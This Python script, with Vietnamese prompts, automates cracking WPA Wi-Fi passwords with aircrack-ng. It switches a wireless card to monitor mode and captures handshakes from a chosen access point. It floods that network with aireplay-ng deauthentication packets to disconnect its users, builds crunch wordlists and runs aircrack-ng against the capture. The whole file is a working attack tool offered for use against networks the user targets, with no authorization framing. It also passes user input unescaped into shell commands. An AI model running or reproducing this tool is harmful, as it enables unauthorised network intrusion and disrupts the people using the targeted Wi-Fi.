#Nạp các dữ liệu càn thiết

import os
import time
from threading import Thread
import threading
import sys
import os.path
from multiprocessing import Process
#----------------------------------------------
# Các giá trị đặt trước

help_error = set(['h','H'])
card_network = os.listdir('/sys/class/net/')
yes = set(['yes','y', 'ye', 'Y','Ye','YES']) 
no = set(['n','no','N','NO'])
PATH = 'Sat-pwd.txt'

#-----------------------------------------------
# Bắt đầu chương trình
#-------------------------------------------  
def attack():
    os.system('clear')
    input('<><> Enter để tiếp tục : ')
    pwd = input('<><> Đường dẫn đến file password : ')
    path_check = os.path.isfile(pwd)
    while path_check is False:
        pwd = input('<><> [ ! ] File không tồn tại [ ! ] Nhập lại : ')
        path_check = os.path.isfile(pwd)
    os.system('clear')
    os.system('sudo aircrack-ng -a 2 -w '+pwd+' '+'"'+essid+'-01.cap'+'"')
    os.system('rm *.cap *.csv *.netxml')
    input(''''
<><><><><><><><><><><><><><><><><><><><><><><><><><>

 [ ! ] Đã có mật khẩu. Nhấn Enter để thoát chương trình [ ! ]

 [ ! ] Nếu chưa có . Đảm bảo rằng mục tiêu của bạn đang có ít nhất một người đang dùng Wifi và khoảng cách sóng đủ mạnh [ ! ] 
<><><><><><><><><><><><><><><><><><><><><><><><><><>''')
    os.system('airmon-ng stop '+interface+'mon')
    os.system('clear')
    exit()
 
#------------------------------------------------
def help():
    os.system('clear')
    print ('''[ ! ] Lỗi xảy ra do các nguyên nhân sau [ ! ]
1. Máy của bạn không hỗ trợ 
2. Bạn gõ không đúng tên giao diện [ Không thêm bất cứ kí tự khác kể cả dấu trắng ]
3. Bạn chọn không đúng tên giao diện mạng [ Đảm bảo bạn chọn Wireless ]
4. Bạn đã bật chế độ Monitor trên giao diện đó [ Chỉ cần tắt đi là được ]

[ ! ] Nếu không giả quyết được vui lòng liên hện : itsat1728.blogspot.com [ ! ]

<><> Nhấn Enter để quay lại ! <><>''')
    input('<><> Enter ?')
    tuy_chon3()
#--------------------------------------------  
def information():
    global essid
    print('''


<><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><>

[ ! ] Nhắm mục tiêu của bạn và cho chúng tôi biết các giá trị sau : CH - BSSID - ESSID [ ! ] 

<><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><>''') 
    print('<><><><><> [ ! ]  https://itsat1728.blogspot.com  [ ! ] <><><><><>')
    input('<><><><><>  [ ! Enter để tiếp tuc ! ]')
    print('''<><><><><><><><><><><><><><>

KHÔNG ĐƯỢC PHÉP CHỨA BẤT KÌ DẤU CÁCH NÀO TRONG CÁC CÂU TRẢ LỜI !

1. Lỗi sẽ xảy ra nếu bạn làm sai.
2. Lỗi xảy ra nếu bạn gõ sai 

<><><><><><><><><><><><><><><>''')
    ch = input('<><> CH : ')
    while ch < '1' :
       print('<><> Đùa nhau hả ?') 
       ch = input('<><> CH : ')
    bssid = input('<><> BSSID : ')
    essid = input('<><> ESSIS : ')  
    os.system('clear')
    def scanner():
       os.system('sudo airodump-ng -c '+ch+' --bssid '+bssid+' -w '+'"'+essid+'"'+' '+interface+'mon')
    def scanner2():
       os.system('xfce4-terminal -x sudo aireplay-ng -0 1000 -a '+bssid+' '+interface+'mon')
    def stop_scanner():
       os.system('killall airodump-ng')
       os.system('killall aireplay-ng')
    t1 = Process(target=scanner)
    t2 = Process(target=scanner2)
    t3 = Process(target=stop_scanner)
    t1.start()
    t2.start()
    time.sleep(120)
    t3.start()
    os.system('clear')
    attack()
 
#--------------------------------------------
                
def banner():
    os.system('clear')
    print('''
              CHƯƠNG TRÌNH BÁN TỰ ĐỘNG HÓA AIRCRACK-NG 
              AUTHOR : IT SAT [ PyThOn 3 ]
              BLOG   : HTTPS://ITSAT1728.BLOGSPOT.COM

''')
    print(' [ ! ] Người sủ dụng :'+ name +' [ ! ]')
    print('''
1. YÊU CẦU :

> Aircrack-ng
> Crunch
> Root [ Bạn có thể sửa bằng cachs thêm sudo vào các lệnh trong này ]
> Đọc README.txt
> Sử dụng màn hình trong kích cỡ tối đa

2. TÙY CHỌN

1. Cài đặt Aircrack-ng và các chương trình liên quan
2. Tạo file từ điển mật khẩu bằng crunch
3. Có tất rồi ! Bỏ qua và chuyển đến chương trình chính
4. Thoát 

<><><><><><><><><><><><><><><<><><><><><><><><><><><><><> ''') 

#-----------------------------------------------------------
def crunch():
    os.system('clear')
    print('''Crunch sẽ dùng theo lệnh cấu trúc như sau : 
crunch [min] [max] [charset] -t [pattern] -o [path file]
 với:
[charset]: kí tự có trong mật khẩu
[pattern]: các kí tự bạn đã biết chắc
[path file]: đừng dẫn file được tạo ''')   
    so_luong= input('<><> Chọn số lượng kí tự bạn nghĩ có trong mật khẩu [ Chọn số tự nhiên khác 0 nếu bạn không muốn bị lỗi trong các bước tiếp theo ]: \n<><> : ')
    charset = input('<><> Các kí tự bạn nghĩ sẽ có trong mật khẩu : \n<><> : ')
    print('''[ ! ] Các kí tự bãn đã biết chắc là các kí tự bạn đã biết nó là gì và ở vị trí nào [ ! ]
=> Ví dụ bạn nghĩ mật khẩu chứa 3 kí tự và bạn đã biết 1 kí tự là 3 và là kí tự thứ 2 vậy phần này bạn sẽ trả lời là  @3@ 
=> Còn nếu không biết kí tự nào cả hay cách sắp xếp của chúng thì chỉ cần gõ @@@ tương ứng với câu trả lời phía trên của bạn , tức phía trên cùng bạn trả lời là 3 thì dưới này gõ 3 dấu @@@ ''')
    pattern = input ('<><> Các kí tự bạn đã biết chắc : \n<><> : ')
    os.system('clear')
    print('''
<><><><><><><><><><><><><>
''')
    os.system('rm Sat-pwd.txt')
    os.system('crunch '+so_luong+' '+so_luong+' '+charset+' -t '+pattern+' -o '+'Sat-pwd.txt')
    print('''
<><><><><><><><><><><><><>
''')
    if os.path.isfile(PATH) and os.access(PATH, os.R_OK):
       print ('''File tạo thành công . Nhấn Enter để quay về trang chủ 
==> File tên : Sat-pwd.txt <==

''')
       input('<><> ? <><>')
       banner()
       tuy_chon()
    else:
       print ('''File tạo không thành công . Thử lại ?

''')
       input('<><> ? <><>')
       banner()
       tuy_chon()
    tuy_chon()
#--------------------------------------------------------------
def tuy_chon3():
    os.system('clear')
    print('<><> Bạn đang ở tùy chọn 3 : '+name+' <><>')
    print ('<><><><><><><><><><><><><><><>')
    os.system('sudo airmon-ng check kill')
    os.system('sudo airmon-ng start '+interface)
    print('<><><><><><><><><><><><><><><>')
    interface2 = os.listdir('/sys/class/net/')
    check = interface+'mon'
    if check in interface2 :
       print (''' 
<><><><><><><><>

Thành công ! . Đã chuyển sang chế độ giám sát <><><>

<><><><><><><><>''')
    else :
       print ('''

[ ! ] Oh No ! Hình như bạn vừa gõ sai tên giao diện hoặc một lỗi không xác định đã xảy ra ! [ ! ] 

''')
       reset = input('''<><> Nhấn Enter để thử lại
<><> Nhấn H để gọi trợ giúp :
<><> Nhấn 2 để bỏ qua lỗi và không xử lí được vấn đề. Ha Ha Ha

<><> Bạn muốn ? :''')
       if reset in help_error :
          help()
       elif reset == '2':
          pass
       else:
          tuy_chon3()
    def airodump_ng():
       os.system('airodump-ng wlan0mon')
    def close_airodump():
       os.system('killall airodump-ng')
    p1 = Process(target=airodump_ng)
    p2 = Process(target=close_airodump)
    p1.start()
    time.sleep(60)
    p2.start()
    information()
#---------------------------------------------------------
def tuy_chon2():
    xac_thuc = input('<><> Bạn đang chọn tùy chọn 2 ! Tiếp tục hay không [ Enter để tiếp tục , N để thoát ! ] :>>>: ')
    if xac_thuc in no :
       banner()
       tuy_chon()
    else :
       crunch()
def tuy_chon():
    chon = input('<><> Lựa chọn của bạn là : ')
    if chon == '1':
       os.system('clear')
       os.system('sudo apt install aircrack-ng && sudo apt install crunch')
       banner()
       print('''
<><><><><><><><>

Cài đặt hoàn tất

<><><><><><><><>''')
       tuy_chon()
    elif chon == '2' :
       tuy_chon2()
    elif chon == '3' :
       tuy_chon3()
    elif chon == '4' :
       print ('<><> Bye Bye <><>')
       time.sleep(2)
       os.system('clear')
       exit()
    else :
       banner()
       tuy_chon()
#---------------------------------------
os.system('rm *.cap *.csv *.netxml')
os.system('clear')
name = input('<><> Tên của bạn là gì ? :')
print ('<><> Hiện tại máy bạn đang có các giao diện mạng sau <><>')
print (card_network)
   
interface = input('<><> Tên giao diện mạng bạn định dùng là [!] Giao diện không dây [!]: ')
if interface+'mon' in card_network:
    print('''
<><><><><><><><><><><><><><>

[ ! ] Hình như máy bạn đã bật chế độ monitor. Làm ơn tắt nó đi và chạy lại chương trình nếu không bạn sẽ gặp lỗi ở các bước sau [ ! ]

<><><><><><><><><><><><><><>
''')

else:
    pass
while interface not in card_network:
   interface = input('<><> Tên giao diện mạng bạn định dùng là [!] Giao diện không dây [!]: ')
   if interface+'mon' in card_network:
      print('''
<><><><><><><><><><><><><><>

[ ! ] Hình như máy bạn đã bật chế độ monitor. Làm ơn tắt nó đi và chạy lại chương trình hoặc bạn sẽ bị lỗi ở các bước sau  [ ! ]

<><><><><><><><><><><><><><>

''') 
else:
   banner()
   tuy_chon()

